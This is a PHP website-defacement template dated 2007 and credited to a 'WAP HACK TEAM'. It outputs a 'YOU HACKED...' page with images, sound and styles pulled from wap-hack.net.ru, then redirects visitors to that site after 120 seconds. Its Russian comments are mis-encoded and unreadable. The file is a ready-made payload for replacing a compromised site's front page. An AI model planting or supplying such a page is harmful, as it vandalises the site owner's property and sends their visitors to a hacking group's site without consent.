<?php
///////////////��� ����� �������� �������  �� �������!!!///////////////
////                                                               ////
////        ********* ��������������� v.01 beta *********          ////
////                                                               ////
////                 Made by: Hintoz and Sklep                     ////
////                        ���� 2007�.                            ////
////                  One site: wap-motor.com                      ////
////                 Two site: wap-hack.net.ru                     ////
////               �� ��� ���� ��� ����� �� �������!               ////
////          ICQ � ����� ���� �� ����������� ���������!           ////
////                                                               ////
///////////////////////////////////////////////////////////////////////

/////////////////////////���������/////////////////////////

$images="http://wap-hack.net.ru/images/deface.gif"; //��������
$copy="Site for Hacker"; //�������� ������ �����
$home="wap-hack.net.ru"; //����� ������ �����
$name="WAP HACK TEAM"; //���� ���

///////////////////////////////////////////////////////////

echo'<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="shortcut icon" href="http://wap-hack.net.ru/favicon.ico" alt="YOU HACKED..."><title>YOU HACKED...</title>
<link rel="stylesheet" type="text/css" href="http://wap-hack.net.ru/themes/style.css"></head>
<bgsound src="http://wap-hack.net.ru/images/fantasy.mid" loop="1">
<meta http-equiv="refresh" content="120;URL=http://$home/">
<body bgcolor="#000000">
<!--Hacked by '.$name.'-->
<div class=a><img src="http://wap-hack.net.ru/images/banner.gif" title="This site has broken open '.$name.'..."  alt="Hacked by '.$name.'"><br/>Forgive, you are broken open!</div>
<div align="center">
<img src="'.$images.'" title="This site has broken open '.$name.'..." alt="Ups! Yor hacked!! I&rsquo;m sorry....">
</div><div class=c>
&#187; <a href="http://'.$home.'" title="All on my site!...">'.$copy.'</a>
<br/>
&#187; <a href="http://wap-hack.net.ru" title="Move to site dedicated to network safety...">Wap-Hack.Net.Ru</a>
</div></body></html>';
?>